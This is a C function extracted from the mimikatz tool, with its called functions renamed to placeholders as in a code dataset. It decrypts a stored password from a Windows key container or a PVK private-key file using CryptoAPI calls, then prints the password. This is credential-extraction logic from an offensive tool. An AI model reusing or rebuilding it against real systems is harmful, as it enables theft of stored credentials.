#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_12__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  wchar_t ;
struct TYPE_12__ {int /*<<< orphan*/  cbPvk; } ;
typedef  int /*<<< orphan*/  PVK_FILE_HDR ;
typedef  TYPE_1__* PPVK_FILE_HDR ;
typedef  char* PCWSTR ;
typedef  TYPE_1__* PBYTE ;
typedef  TYPE_1__* LPCBYTE ;
typedef  int /*<<< orphan*/  HCRYPTPROV ;
typedef  scalar_t__ HCRYPTKEY ;
typedef  int /*<<< orphan*/  DWORD ;
typedef  scalar_t__ BOOL ;

/* Variables and functions */
 int CRYPT_MACHINE_KEYSET ; 
 int CRYPT_VERIFYCONTEXT ; 
 scalar_t__ FUNC0 (int /*<<< orphan*/ *,char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int) ; 
 scalar_t__ FUNC1 (scalar_t__,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,TYPE_1__*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (scalar_t__) ; 
 scalar_t__ FUNC3 (int /*<<< orphan*/ ,TYPE_1__*,int /*<<< orphan*/ ,scalar_t__,int /*<<< orphan*/ ,scalar_t__*) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FALSE ; 
 scalar_t__ KULL_M_WIN_BUILD_XP ; 
 int /*<<< orphan*/  LPTR ; 
 scalar_t__ FUNC5 (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC6 (TYPE_1__*) ; 
 scalar_t__ MIMIKATZ_NT_BUILD_NUMBER ; 
 int /*<<< orphan*/  MS_ENH_RSA_AES_PROV ; 
 int /*<<< orphan*/  MS_ENH_RSA_AES_PROV_XP ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 int /*<<< orphan*/  PROV_RSA_AES ; 
 int /*<<< orphan*/  FUNC8 (TYPE_1__*,TYPE_1__*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC9 (char*,...) ; 
 scalar_t__ FUNC10 (char*,TYPE_1__**,int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC11 (int,int /*<<< orphan*/ **,char*,char**,int /*<<< orphan*/ *) ; 

void FUNC12(int argc, wchar_t * argv[], PCWSTR keyContainerName, BOOL isMachine, LPCBYTE sessionKey, DWORD szSessionKey, LPCBYTE data, DWORD szData)
{
	BOOL isLive;
	PBYTE liveData;
	DWORD szLiveData, szPvk;
	HCRYPTPROV hProv;
	HCRYPTKEY hKey = 0, hSessionKey;
	PPVK_FILE_HDR pvk = NULL;
	PCWSTR pvkName = NULL;

	isLive = FUNC11(argc, argv, L"live", NULL, NULL);
	if(!FUNC11(argc, argv, keyContainerName, &pvkName, NULL))
		FUNC11(argc, argv, L"pvk", &pvkName, NULL);

	if(isLive || pvkName)
	{
		if((liveData = (PBYTE) FUNC5(LPTR, szData)))
		{
			FUNC8(liveData, data, szData);
			szLiveData = szData;
			if(isLive)
				FUNC9(L"  | Live Key  : %s - %s : ", keyContainerName, isMachine ? L"machine" : L"user");
			if(FUNC0(&hProv, isLive ? keyContainerName : NULL, (MIMIKATZ_NT_BUILD_NUMBER <= KULL_M_WIN_BUILD_XP) ? MS_ENH_RSA_AES_PROV_XP : MS_ENH_RSA_AES_PROV , PROV_RSA_AES, (isLive ? 0 : CRYPT_VERIFYCONTEXT) | (isMachine ? CRYPT_MACHINE_KEYSET : 0)))
			{
				if(isLive)
					FUNC9(L"OK\n");
				else
				{

					if(FUNC10(pvkName, (PBYTE *) &pvk, &szPvk))
					{
						FUNC9(L"  | PVK file  : %s - \'%s\' : ", keyContainerName, pvkName);
						if(FUNC3(hProv, (PBYTE) pvk + sizeof(PVK_FILE_HDR), pvk->cbPvk, 0, 0, &hKey))
							FUNC9(L"OK\n");
						else FUNC7(L"CryptImportKey (RSA)");
					}
				}
				if(isLive || hKey)
				{
					if(FUNC3(hProv, sessionKey, szSessionKey, hKey, 0, &hSessionKey))
					{
						if(FUNC1(hSessionKey, 0, FALSE, 0, liveData, &szLiveData))
						{
							FUNC9(L"  | Password  : %s\n", liveData + sizeof(DWORD) /*CRC32 ? Random ?*/);
						}
						else FUNC7(L"CryptDecrypt");
						FUNC2(hSessionKey);
					}
					else FUNC7(L"CryptImportKey (session)");
				}
				if(!isLive)
				{
					if(hKey)
						FUNC2(hKey);
					if(pvk)
						FUNC6(pvk);
				}
				FUNC4(hProv, 0);
			}
			else FUNC7(L"CryptAcquireContext");
			FUNC6(liveData);
		}
	}
}